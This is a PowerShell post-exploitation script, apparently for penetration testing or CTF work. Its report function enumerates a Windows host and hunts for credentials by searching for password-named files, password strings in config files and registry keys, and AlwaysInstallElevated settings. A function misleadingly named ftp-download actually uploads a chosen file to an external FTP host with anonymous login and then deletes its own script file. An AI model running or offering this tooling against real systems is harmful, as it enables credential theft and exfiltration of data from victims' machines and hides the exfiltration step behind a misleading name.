function generate-report {

    function run_cmd {
        param (
            [string]$cmd
        )
        
        echo "### $cmd" >> report.md
        echo "``````powershell" >> report.md
        Invoke-Expression $cmd >> report.md 2>&1
        echo "``````" >> report.md
    }

    echo "# OS & Arch" >> report.md

    run_cmd "net config Workstation"
    run_cmd "systeminfo | findstr /B /C:`"OS Name`" /C:`"OS Version`""
    run_cmd "hostname"

    echo "# User Info / Group memberships of Current User" >> report.md

    echo "# Other Users & Groups" >> report.md
    run_cmd "net users"
    
    echo "# Network" >> report.md
    run_cmd "ipconfig /all"
    run_cmd "route print"
    run_cmd "arp -A"
    run_cmd "netstat -ano"
    run_cmd "netsh firewall show state"
    run_cmd "netsh firewall show config"

    echo "# Installed Applications" >> report.md
    run_cmd "dir C:\'Program Files'"
    run_cmd "dir C:\'Program Files (x86)'"

    echo "# Running Process" >> report.md
    run_cmd "tasklist /SVC"
    run_cmd "schtasks /query /fo LIST /v"
    run_cmd "net start"

    echo "# Interesting Directory" >> report.md
    run_cmd "dir C:\Users"
    run_cmd "dir C:\Users\Public"
    run_cmd "dir C:"

    echo "# Interesting Files" >> report.md
    run_cmd "dir /s *pass* == *cred* == *vnc* == *.config*"
    run_cmd "findstr /si password *.xml *.ini *.txt"

    echo "# Disk & Drivers" >> report.md
    run_cmd "DRIVERQUERY"

    echo "# Registry" >> report.md
    run_cmd "reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated"
    run_cmd "reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated"
    run_cmd "reg query HKLM /f password /t REG_SZ /s"
    run_cmd "reg query HKCU /f password /t REG_SZ /s"

    echo "# Disc" >> report.md    


    echo "REPORT COMPLETE!"
}

function ftp-download {
    param (
        [string]$host_ip,
        [string]$file_path,
        [switch]$h
    )

    # If -h is passed, display the usage instructions
    if ($h) {
        Write-Host "Usage: download -host_ip <FTP_HOST> -file_path <FILE_PATH>"
        Write-Host 'Example: download -host_ip "10.10.10.1" -file_path "C:\path\to\your\file.txt"'
        return
    }

    # Check if both host and file_path are provided
    if (-not $host_ip -or -not $file_path) {
        Write-Host "Error: Both -host_ip and -file_path parameters are required."
        Write-Host 'Run download -h for help.'
        return
    }

    # Generate the ftp_script.txt with necessary FTP commands
    $ftpScriptContent = @"
open $host_ip 21
anonymous
anonymous
binary
put $file_path
quit
"@

    # Write the content to ftp_script.txt
    $scriptFilePath = "ftp_script.txt"
    $ftpScriptContent | Set-Content -Path $scriptFilePath

    # Run the FTP script
    ftp -s:$scriptFilePath

    # Delete the ftp_script.txt file after running
    Remove-Item -Path $scriptFilePath -Force
}
